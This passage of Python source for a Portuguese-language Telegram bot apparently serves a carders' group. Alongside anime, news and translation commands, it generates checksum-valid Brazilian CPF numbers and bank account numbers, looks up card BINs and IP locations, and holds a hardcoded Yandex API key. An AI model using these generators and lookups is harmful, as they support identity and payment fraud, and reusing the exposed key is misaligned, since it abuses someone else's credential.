							emissora_anime = "NENHUMA"
						audio_anime = source_anime.find("span", {"class":"audio-video"}).text
						sinopse_anime = source_anime.find_all("p")[0].text
						if(sinopse_anime == None or sinopse_anime == ""):
							sinopse_anime = "Não encontrada!"
						c_temp_anime = len(source_anime.find("ul", {"class":"tabs"}).find_all("li"))
						dados_anime = f"""<b>💭 Nome do anime:</b>
<pre>{nome_anime}</pre>
							
<b>⏰ Tempo de episódios:</b>
<pre>{tempo_anime}</pre>
						
<b>🗓 Anime lançado em:</b>
<pre>{lancamento_anime.split()[1]}</pre>

<b>❇️ Emissora:</b>
<pre>{emissora_anime}</pre>

<b>🔉 Audio:</b>
<pre>{" ".join(map(str, audio_anime.split()[1:]))}</pre>

<b>✳️ Total de capítulos:</b>
<pre>{c_temp_anime}</pre>

<b>Sinopse:</b>
<pre>{sinopse_anime}</pre>

<b>ASSISTA O ANIME CLICANDO</b> <a href="{link_anime}">AQUI</a>"""
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados_anime, parse_mode="html", disable_web_page_preview = True)
					except:
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text="<b>Anime não encontrado!</b>", parse_mode="html")
				
				
				
				
				
				
				
				
				
				
				
				elif(msg["text"].split()[0].upper() == "/YOUTUBE" and msg["text"].split()[1]):
					titulo = msg["text"][9:]
					msg_bot = bot.sendMessage(msg["chat"]["id"], f"<b>Procurando por</b> <pre>{titulo}</pre> <b>no youtube, por favor aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
					response = search_query_yt(titulo)["bot_api_yt"]
					resultado = ""
					for video in response:
						titulo2 = video["title"]
						link = video["url"]
						resultado += f"""<b>Título do(a) Video/PlayList:</b> <pre>{titulo2}</pre>
Clique <a href='{link}'>Aqui</a> para assistir.

"""
					if(resultado != ""):
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>{len(response)} Resultados para a busca</b> <pre>{titulo}</pre><b>:</b>\n\n{resultado}", parse_mode="html", disable_web_page_preview=True)
					else:
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>Nenhum resultado retornado para a busca:</b> <pre>{titulo}</pre>.", parse_mode="html", disable_web_page_preview=True)
				elif(msg["text"].split()[0].upper() == "/CPFGEN" and msg["text"].split()[1]):
					quantidade = msg["text"].split()[1]
					cpfs = ""
					try:
						quantidade = int(quantidade)
						if(quantidade > 0):
							if(quantidade < 46):
								template = 0
								cpfs_gerados = []
								while(not template == quantidade):
									template += 1
									cpf = f"0{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}"
				
									num1 = int(cpf[0])
									num2 = int(cpf[1])
									num3 = int(cpf[2])
									num4 = int(cpf[3])
									num5 = int(cpf[4])
									num6 = int(cpf[5])
									num7 = int(cpf[6])
									num8 = int(cpf[7])
									num9 = int(cpf[8])
					
									multi1 = 11 - (((num1 * 10) + (num2 * 9) + (num3 * 8) + (num4 * 7) + (num5 * 6) + (num6 * 5) + (num7 * 4) + (num8 * 3) + (num9 * 2)) % 11)
									if(multi1 > 9):
										multi1 = 0
					
									multi2 = 11 - (((num1 * 11) + (num2 * 10) + (num3 * 9) + (num4 * 8) + (num5 * 7) + (num6 * 6) + (num7 * 5) + (num8 * 4) + (num9 * 3) + (multi1 * 2)) % 11)
									if(multi2 > 9):
										multi2 = 0
							
									cpf_novo = f"<b>#{str(template).zfill(len(str(quantidade)))}</b> -> <pre>{cpf}{multi1}{multi2}</pre>"
									cpfs += cpf_novo+"\n"
								keyboard = InlineKeyboardMarkup(inline_keyboard=[[
									InlineKeyboardButton(text='🔄 Atualizar', callback_data='refresh_cpf')],
									[InlineKeyboardButton(text='🔍 ', callback_data='consultar_cpf')
								]])
								bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADOS:</b>\n\n{cpfs}", "html", reply_to_message_id = msg['message_id'], reply_markup=keyboard)
							else:
								bot.sendMessage(msg["chat"]["id"], f"<b>-> O LIMITE DE CPF É DE 45 PARA NÃO TER FLOOD</b>", "html", reply_to_message_id = msg['message_id'])
						else:
							bot.sendMessage(msg["chat"]["id"], f"<b>@{usuario}\n\nCOLOQUE UM VALOR MAIOR QUE ZERO NA QUANTIDADE DO CPF.</b>","html")
					except ValueError:
						bot.sendMessage(msg["chat"]["id"], f"<b>QUANTIDADE INVÁLIDA!</b>", "html", reply_to_message_id = msg['message_id'])
				elif(msg["text"].upper() == "/BIN"):
					bot.sendMessage(msg["chat"]["id"], help_bin, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"] == "/ip"):
					bot.sendMessage(msg["chat"]["id"], help_ip, "html", reply_to_message_id = msg["message_id"])
				#elif(msg["text"]):
					#bot.forwardMessage(msg["chat"]["id"], "@InternetFreeOfc", msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/IP" and msg["text"].split()[1]):
					try:
						ip_alvo = msg["text"].split()[1]
						url_ip = f"http://ip-api.com/json/{ip_alvo}"
						requests_ip = requests.get(url_ip).json()
						ip_cidade = requests_ip["city"]
						ip_pais = requests_ip["country"]
						ip_busca = requests_ip["query"]
						ip_estado = f"{requests_ip['regionName']} - {requests_ip['region']}"
						ip_latitude = requests_ip["lat"]
						ip_longitude = requests_ip["lon"]
						ip_timezone = requests_ip["timezone"]
						ip_isp = requests_ip["isp"]
						ip_org = requests_ip["org"]
						ip_provedor = requests_ip["as"]
						dados_ip = f"""<b>RESULTADOS:
					
PROVEDOR:</b>
<pre>{ip_provedor}</pre>

<b>CIDADE:</b>
<pre>{ip_cidade}</pre>

<b>PAÍS:</b>
<pre>{ip_pais}</pre>

<b>BUSCA:</b>
<pre>{ip_busca}</pre>

<b>ESTADO:</b>
<pre>{ip_estado}</pre>

<b>LATITUDE:</b>
<pre>{ip_latitude}</pre>

<b>LONGITUDE:</b>
<pre>{ip_longitude}</pre>

<b>FUSO HORÁRIO:</b>
<pre>{ip_timezone}</pre>

<b>ISP:</b>
<pre>{ip_isp}</pre>

<b>ORG:</b>
<pre>{ip_org}</pre>"""
						bot.sendMessage(msg["chat"]["id"], dados_ip, "html", reply_to_message_id = msg["message_id"])
					except:	
						bot.sendMessage(msg["chat"]["id"], f"<b>VOCÊ INSERIU UM IP INVÁLIDO!</b>", "html", reply_to_message_id = msg["message_id"])
	
				elif(msg["text"].split()[0].upper() == "/BIN" and msg["text"][1]):
					msg_bot = bot.sendMessage(msg["chat"]["id"], "<b>CONSULTANDO DADOS DA BIN..</b>", "html", reply_to_message_id=msg["message_id"])
					try:
						url_bin = f"https://lookup.binlist.net/{msg['text'].split()[1]}"
						requests_bin = requests.get(url_bin).text
						api_bin = json.loads(requests_bin)
						bandeira_bin = api_bin["scheme"]
						try:
							tipo_bin = api_bin["type"]
							if(tipo_bin == "debit"):
								tipo_bin = "Débito"
							else:
								tipo_bin = "Crédito"
						except:
							tipo_bin = "NENHUM"
					
						try:
							categoria_bin = api_bin["brand"]
						except:
							categoria_bin = "NENHUMA"
					
						prefixo_bin = msg["text"].split()[1][0:7]
					
						try:
							logo_bin = api_bin["bank"]["logo"]
						except:
							logo_bin = "NENHUMA"
		
						try:
							telefone_bin = api_bin["bank"]["phone"]
							if(telefone_bin == ""):
								telefone_bin = "NENHUM"
						except:
							telefone_bin = "NENHUM"
			
						try:
							site_bin = api_bin["bank"]["url"]
						except:
							site_bin = "NENHUM"
			
						try:
							nomebanco_bin = api_bin["bank"]["name"]
							if(nomebanco_bin == ""):
								nomebanco_bin = "NENHUM"
						except:
							nomebanco_bin = "NENHUM"
			
						pais_bin = api_bin["country"]["name"]
						uf_bin = api_bin["country"]["alpha2"]
						longitude_bin = api_bin["country"]["longitude"]
						if(longitude_bin == ""):
							longitude_bin = "NENHUMA"
		
						latitude_bin = api_bin["country"]["latitude"]
						if(latitude_bin == ""):
							latitude_bin = "NENHUMA"
		
	
						if(bandeira_bin == ""):
							bandeira_bin = "SEM BANDEIRA"
		
						if(tipo_bin == "DEBIT"):
							tipo_bin = "DÉBITO"
						elif(tipo_bin == "CREDIT"):
							tipo_bin = "CRÉDITO"
						elif(tipo_bin == ""):
							tipo_bin = r"NENHUM"
			
						if(categoria_bin == ""):
							categoria_bin = "NENHUMA"
		
						if(logo_bin == ""):
							logo_bin = "NENHUMA"
		
						if(site_bin == ""):
							site_bin = "NENHUM"
				
				
						resultado_bin = f"""<strong>BANDEIRA: </strong>
<code>{bandeira_bin.title()}</code>
				
<strong>TIPO: </strong>
<code>{tipo_bin}</code>
				
<strong>CATEGORIA: </strong>
<code>{categoria_bin.title()}</code>
				
<strong>PREFIXO: </strong>
<code>{prefixo_bin}</code>
				
<strong>LOGO: </strong>
<code>{logo_bin}</code>
				
<strong>TELEFONE: </strong>
<code>{telefone_bin}</code>
				
<strong>SITE: </strong>
<code>{site_bin}</code>
				
<strong>BANCO: </strong>
<code>{nomebanco_bin}</code>
				
<strong>PAIS: </strong>
<code>{pais_bin} - {uf_bin}</code>
				
<strong>LATITUDE: </strong>
<code>{latitude_bin}</code>
				
<strong>LONGITUDE: </strong>
<code>{longitude_bin}</code>"""
				
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=resultado_bin, parse_mode="html")
					except:
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text="<b>BIN NÃO ENCONTRADA OU INVÁLIDA.</b>", parse_mode="html")
				elif(msg["text"][0] == "/" and msg["text"][2] and not msg["text"].split()[0].lower() in comandos_lista):
					bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre><b>, VOCÊ ENVIOU UM COMANDO INEXISTENTE.</b>\n\nMensagem: <pre>{msg['text']}</pre>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/CRIPTOCOINS"):
					url_criptocoins = "https://api.coinmarketcap.com/v2/ticker/"
					response_criptocoins = requests.get(url_criptocoins)
					nomes_rank = ""
					simbolos_rank = ""
					for teste in response_criptocoins.json()["data"]:
						nomes_rank += f"{response_criptocoins.json()['data'][teste]['name']}\n"
						simbolos_rank += f"{response_criptocoins.json()['data'][teste]['symbol']}\n"
					nomes_rank = nomes_rank.split("\n")
					simbolos_rank = simbolos_rank.split("\n")
					dados_rank = f"""<b>RESULTADO DAS POSIÇÕES:

1° LUGAR.
 • NOME:</b> <pre>{nomes_rank[0]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[0]}</pre>
 
<b>2° LUGAR.
 • NOME: </b><pre>{nomes_rank[1]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[1]}</pre>

<b>3° LUGAR.
 • NOME: </b><pre>{nomes_rank[2]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[2]}</pre>

<b>4° LUGAR.
 • NOME: </b><pre>{nomes_rank[3]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[3]}</pre>

<b>5° LUGAR.
 • NOME: </b><pre>{nomes_rank[4]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[4]}</pre>

<b>6° LUGAR.
 • NOME: </b><pre>{nomes_rank[5]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[5]}</pre>

<b>7° LUGAR.
 • NOME: </b><pre>{nomes_rank[6]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[6]}</pre>

<b>8° LUGAR.
 • NOME: </b><pre>{nomes_rank[7]}</pre>
 <b>• SIMBOLO:</b> <pre>{simbolos_rank[7]}</pre>
"""
					bot.sendMessage(msg["chat"]["id"], dados_rank, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/COTACAO"):
					url_cotacao = "https://www.mercadobitcoin.net/api/BTC/ticker/"
					response_btc = requests.get(url_cotacao).json()
					preco_btc = response_btc["ticker"]["last"]
					dados_cotacao = f"""<b>BITCOIN:</b>
 <b>• Unidade de um bitcoin.</b>
 <b>• Valor:</b> <pre>R${preco_btc[0:2]}.{preco_btc[2:].replace('.', ',')}</pre> Reais
 <b>• Fonte:</b> <a href='www.mercadobitcoin.com.br'>Mercado Bitcoin</a>"""
					bot.sendMessage(msg["chat"]["id"], dados_cotacao, "html", reply_to_message_id = msg["message_id"], disable_web_page_preview=True)
				elif(msg["text"].split()[0].upper() == "/FIGLET" or msg["text"].split()[0].upper() == "!FIGLET"):
					fonte = msg["text"].split()[1].upper()
					if(fonte == "3D"):
						fonte = "larry3d"
					else:
						fonte = "big"
					mensagem = msg["text"][11:]
					mensagem = pyfiglet.figlet_format(mensagem, font=fonte)
					bot.sendMessage(msg["chat"]["id"], f"<pre>{html.escape(mensagem)}</pre>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"] in emojis):
					bot.sendMessage(msg["chat"]["id"], choice(emojis),reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "PING" or msg["text"].upper() == "/PING"):
					keyboard2 = InlineKeyboardMarkup(
						inline_keyboard=[
							[InlineKeyboardButton(text='Ver Novamente', callback_data='try_ping')]
						]
					)
					first = time()
					msg_bot = bot.sendMessage(msg["chat"]["id"], "<b>Capturando tempo de resposta, por favor aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
					second = time()
					ms = str(second-first)[:5]
					bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>Tempo de resposta.. {ms} ms!</b>", parse_mode="html", reply_markup=keyboard2)
				elif(msg["text"].upper() == "/NOTICIAS" or msg["text"].upper() == "/NOTICIA"):
					msg1 = bot.sendMessage(msg["chat"]["id"], "<b>Procurando noticias recentes, isso pode demorar um pouco..</b>", "html", reply_to_message_id = msg["message_id"])
					url_noticia = "https://g1.globo.com"
					response_noticia = requests.get(url_noticia).text
					source_noticia = bs(response_noticia, "html.parser")
					noticia_tag = source_noticia.find_all("span", {"class":"feed-post-header-chapeu"})[0].text
					noticia_link = source_noticia.find_all("a", {"class":"feed-post-link gui-color-primary gui-color-hover"})[0]["href"]
					noticia_titulo = source_noticia.find_all("a", {"class":"feed-post-link gui-color-primary gui-color-hover"})[0].text
					noticia_descricao = source_noticia.find_all("div", {"class":"feed-post-body-resumo"})[0].text
					noticia_inteira = f"""<b>NOTICIA DE HOJE/AGORA:
					
🔍 TAG:</b>
<i>{noticia_tag}</i>
					
<b>TÍTULO:</b>
<pre>{noticia_titulo.strip()}</pre>

<b>RESUMO:</b>
<pre>{noticia_descricao.strip()}</pre> <a href="{noticia_link}">Veja mais</a>

<b>➡️ FONTE:</b> <pre>https://g1.globo.com</pre>"""
					bot.editMessageText((msg["chat"]["id"], msg1["message_id"]), text=noticia_inteira, parse_mode="html", disable_web_page_preview = True)
				elif(msg["text"] == "<3"):
					try:
						if(msg["reply_to_message"]["from"]["username"] == "MaxCardersBot"):
							lista_zueira = ["a","h", "s","u"]
							bot.sendMessage(msg["chat"]["id"], f"<b>Tb te amo &lt;3\nHa{choice(lista_zueira)}{choice(lista_zueira)}{choice(lista_zueira)}{choice(lista_zueira)}{choice(lista_zueira)}{choice(lista_zueira)}{choice(lista_zueira)}</b>", "html", reply_to_message_id = msg["message_id"])
					except:
						pass
				elif(msg["text"].split()[0].upper() == "RT" or msg["text"].split()[0].upper() == "/RT"):
					aspas = '"'
					bot.sendMessage(msg["chat"]["id"], f"<b>➡️O USUÁRIO: </b>\n<pre>{msg['from']['first_name']}</pre>\n\n\n<b>🔄RETWEETOU A MENSAGEM DE:</b>\n<pre>{msg['reply_to_message']['from']['first_name']}</pre><b>.</b>\n\n<b>{aspas}</b><pre>{html.escape(msg['reply_to_message']['text'])}</pre><b>{aspas}</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].upper() == "/ADMINS"):
					try:
						msg_bot = bot.sendMessage(msg["chat"]["id"], "<b>Obtendo lista de admins, por favor aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
						admins_list = bot.getChatAdministrators(msg["chat"]["id"])
						todos_admins = ""
						count_admins = 0
						keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='🔄 Atualizar Lista', callback_data='atualizar_admins')]])
						for x in admins_list:
							count_admins += 1
							status = x["status"]
							try:
								segundo_nome = f'<pre>{x["user"]["last_name"]}</pre>'
							except:
								segundo_nome = ""
							
							try:
								username = "@"+x["user"]["username"]
							except:
								username = "Sem nome de usuário"
						
							if(status == "administrator"):
								status = "🏅 ADMIN"
							else:
								status = "🥇 CRIADOR"
						
							if(username != "Sem nome de usuário"):
								if(x["user"]["username"] in ["Jhow_silva", "Leomaldonado"]):
									status = "🏅 ADMIN, FORNECEDOR"
							todos_admins += f'<b>{str(count_admins).zfill(2)}# {status}\nNOME:</b> <pre>{x["user"]["first_name"]}</pre> {segundo_nome}\n<b>USUÁRIO:</b> {username}\n\n'
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=todos_admins, parse_mode="html", reply_markup=keyboard)
					except:
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text="<b>Po, não tem como obter a lista de admins porque aqui não é um grupo ou canal, tente enviar esse comando através de um grupo ou canal pra obter êxito.</b>", parse_mode="html")
				elif(msg["text"].upper() == "/FAKEDATABR"):
					bot_msg = bot.sendMessage(msg["chat"]["id"], "<b>Gerando Pessoa, por favor aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
					url = "https://www.4devs.com.br/ferramentas_online.php"
					payload = {"acao":"gerar_pessoa"}
					response_people = requests.post(url, data=payload)
					dados = ""
					for pessoa in response_people.json():
						dados += (f"<b>{pessoa.upper().replace('TIPO_SANGUINEO','TIPO SANGÜINEO').replace('TELEFONE_FIXO','TELEFONE FIXO').replace('ENDERECO','ENDEREÇO').replace('DATA_NASC', 'DATA DE NASCIMENTO').replace('COR','COR FAVORITA')}:</b>\n<pre>{response_people.json()[pessoa]}</pre>\n\n")
					bot.editMessageText((msg["chat"]["id"], bot_msg["message_id"]), text=f"<b>RESULTADO:</b>\n\n{dados}", parse_mode="html")
				elif(msg["text"].split()[0].upper() == "/MP3" and msg["text"].split()[1]):
					id_video = msg["text"][-11:]
					url = f"https://downloadvideo.ninja/download-youtube-video/{id_video}"
					r = requests.get(url).text
					source = bs(r, "html.parser")
					link_home = source.find_all("a")[-5]["href"]
					keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='⬇️ DOWNLOAD', callback_data='link_mp3', url=link_home)]])
					bot.sendMessage(msg["chat"]["id"], "<b>✅ CLIQUE NO BOTÃO ABAIXO PARA FAZER O DOWNLOAD DA MUSICA.</b>", "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
				elif(msg["text"].split()[0].upper() == "/MP4" and msg["text"].split()[1]):
					id_video = msg["text"].split()[1]
					if(id_video.index("youtu") > 0):
						id_video = id_video[-11:]
					url_api_mp4 = f"https://you-link.herokuapp.com/?url=https://www.youtube.com/watch?v={id_video}"
					response_url_mp4 = requests.get(url_api_mp4).json()
					link_video_mp4 = response_url_mp4[0]["url"]
					keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='⬇ ️DOWNLOAD', callback_data='link_mp3', url = link_video_mp4)]])
					bot.sendMessage(msg["chat"]["id"], "<b>✅ CLIQUE NO BOTÃO ABAIXO PARA FAZER O DOWNLOAD DO VIDEO.</b>", "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
				
				
				
				
				
				
				
				
				
				
		
		
		
		
		
		
		
		
		
		
		
		
		
				elif(msg["text"].split()[0].upper() == "TESTE"):
					keyboard = InlineKeyboardMarkup(
						inline_keyboard=[
							
						]
					)
					for x in range(0, 10):
						keyboard[0].append([InlineKeyboardButton(text=f'{x}', callback_data=f'{x}')])
					bot.sendMessage(msg["chat"]["id"], "teste", reply_markup=keyboard)
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				elif((msg["text"].split()[0].upper() == "/TRADUZ")):
					try:
						texto_yandex = msg["reply_to_message"]["message"]["text"]
					except:
						texto_yandex = msg["text"][8:]
					
					msg_yandex = bot.sendMessage(msg["chat"]["id"], "<b>🌐 Traduzindo..</b>", "html", reply_to_message_id = msg["message_id"])
					url_yandex = "https://translate.yandex.net/api/v1.5/tr.json/translate"
					url_detect_yandex = "https://translate.yandex.net/api/v1.5/tr.json/detect"
					params1 = {"key":"trnsl.1.1.20180715T070837Z.d448942324bc18e0.cd6fcecdc1d847196b82fda3d92c698899c19c1f", "lang":"pt", "text":texto_yandex}
					params2 = {"key":"trnsl.1.1.20180715T070837Z.d448942324bc18e0.cd6fcecdc1d847196b82fda3d92c698899c19c1f","text":texto_yandex}
					response_yandex = requests.get(url_yandex, params=params1).json()
					response_detect_yandex = requests.get(url_detect_yandex, params=params2).json()
					detected = response_detect_yandex["lang"]
					
					if(detected == "en"):
						detected = "🇺🇸Inglês"
					if(detected == "es"):
						detected = "🇪🇸Espanhol"
					if(detected == "ru"):
						detected = "🇷🇺Russo"
					if(detected == "pt"):
						detected = "🇧🇷Português"
					if(detected == "sq"):
						detected = "🇦🇱Albanês"
					if(detected == ""):
						detected = "NENHUM"
						
					translated = f"""<b>🔃 IDIOMA DETECTADO:</b>
<pre>{detected}</pre>

<b>🍁 TEXTO:</b>
<pre>{html.escape(texto_yandex)}</pre>

<b>🌍 TRADUÇÃO:</b>
<pre>{html.escape(response_yandex["text"][0])}</pre>"""
					bot.editMessageText((msg["chat"]["id"], msg_yandex["message_id"]), text=translated, parse_mode="html")
				
				elif(msg["text"].split()[0].upper() == "/CEP" and msg["text"].split()[1]):
					cep = msg["text"].split()[1]
					url_cep = f"https://viacep.com.br/ws/{cep}/json/"
					try:
						response_cep = requests.get(url_cep).json()
						cep_rua = response_cep["logradouro"]
						if(cep_rua == ""):
							cep_rua = "NENHUM"
							
						cep_complemento = response_cep["complemento"]
						if(cep_complemento == ""):
							cep_complemento = "NENHUM"
							
						cep_gia = response_cep["gia"]
						if(cep_gia == ""):
							cep_gia = "NENHUM"
						
						cep_cidade = f"{response_cep['localidade']} - {response_cep['uf']}"
						if(cep_cidade == ""):
							cep_cidade = "NENHUM"
						
						cep_ibge = response_cep["ibge"]
						if(cep_ibge == ""):
							cep_ibge = "NENHUM"
						
						cep_bairro = response_cep["bairro"]
						if(cep_bairro == ""):
							cep_bairro = "NENHUM"
						
						dados_cep = f"""<b>RESULTADOS:

RUA/LOGRADOURO:</b>
<pre>{cep_rua}</pre>

<b>CEP:</b>
<pre>{cep}</pre>

<b>COMPLEMENTO:</b>
{cep_complemento}

<b>BAIRRO:</b>
<pre>{cep_bairro}</pre>

<b>CIDADE E ESTADO:</b>
<pre>{cep_cidade}</pre>

<b>IBGE:</b>
<pre>{cep_ibge}</pre>

<b>GIA:</b>
<pre>{cep_gia}</pre>"""
						bot.sendMessage(msg["chat"]["id"], dados_cep, "html", reply_to_message_id = msg["message_id"])
					except:
						bot.sendMessage(msg["chat"]["id"], "<b>CEP NÃO ENCONTRADO!</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/CBGEN" and msg["text"].split()[1]):
					contas = ""
					try:
						quantidade = int(msg["text"].split()[2])
						erro = False
						if(quantidade > 0 and quantidade < 91):
							template_cbgen = 0
							while(not template_cbgen == quantidade):
								template_cbgen += 1
								operacao = msg["text"].split()[1]
								conta = f"{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}"
								agencia = f"{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}{randint(0, 9)}"
			
								try:
									op1 = int(operacao[0])
									op2 = int(operacao[1])
									op3 = int(operacao[2])
								except:
									bot.sendMessage(msg["chat"]["id"], "<b>A OPERAÇÃO PRECISA TER 3 DÍGITOS.</b>", "html", reply_to_message_id = msg["message_id"])
									erro = True
									break
								con1 = int(conta[0])
								con2 = int(conta[1])
								con3 = int(conta[2])
								con4 = int(conta[3])
								con5 = int(conta[4])
								con6 = int(conta[5])
								con7 = int(conta[6])
								con8 = int(conta[7])
					
								age1 = int(agencia[0])
								age2 = int(agencia[1])
								age3 = int(agencia[2])
								age4 = int(agencia[3])
					
								dv_cbgen = (((age1 * 8) + (age2 * 7) + (age3 * 6) + (age4 * 5) + (op1 * 4) + (op2 * 3) + (op3 * 2) + (con1 * 9) + (con2 * 8) + (con3 * 7) + (con4 * 6) + (con5 * 5) + (con6 * 4) + (con7 * 3) + (con8 * 2))*10)%11
								if(dv_cbgen > 9):
									dv_cbgen = 0
								contas += f"<pre>{operacao}|{conta}-{dv_cbgen}|{agencia}</pre>\n"
							if(erro == False):	
								bot.sendMessage(msg["chat"]["id"], f"<b>RESULTADOS:</b>\n\n{contas}", "html", reply_to_message_id = msg["message_id"])
						else:
							bot.sendMessage(msg["chat"]["id"], f"<b>O máximo de contas bancárias que você pode gerar é 90.</b>", "html", reply_to_message_id = msg["message_id"])
					except:
						bot.sendMessage(msg["chat"]["id"], "<b>Formato não encontrado. Para mais detalhes, dê um</b> /cbgen <b>para exibir o modo de uso do comando.</b>", "html", reply_to_message_id = msg["message_id"])
				else:	
					pass
				admins = []
			except ZeroDivisionError:
				pass
		else:
			if(msg["text"][0] == "/" and msg["text"].upper() != "/START" and not msg["from"]["id"] in sessao):
				bot.sendMessage(msg["chat"]["id"], "<b>Não posso aceitar comandos seus no privado, Entre no grupo @MaxCarders e envie os comandos apenas la.\n\n<b>Criador:</b> @TioFlaviin ", "html", reply_to_message_id = msg["message_id"])
			if(msg["text"][0] != "/" and not msg["from"]["id"] in sessao):
				bot.sendMessage(msg["chat"]["id"], "<b>Infelizmente sou apenas um robô que aceita comandos e não conversas.</b>", "html", reply_to_message_id = msg["message_id"])
			if(msg["text"].split()[0] in comandos_lista):
				if(quem != ""):
					bot.sendMessage(msg["chat"]["id"], f"<b>@{usuario}\nO BOT NÃO PODE ACEITAR COMANDOS AGORA PORQUE ELE ESTÁ DESATIVADO.\n\nOBS: NÃO VOU CAGUETAR QUEM FOI QUE DESATIVOU.\nSOU DO BEM.\n\n#PAZ</b>", "html", reply_to_message_id = msg["message_id"])
MessageLoop(bot, {"chat":main_thread, "callback_query":callback_thread}).run_as_thread()
while True:
	try:
		pass
	except KeyboardInterrupt:
		exit()
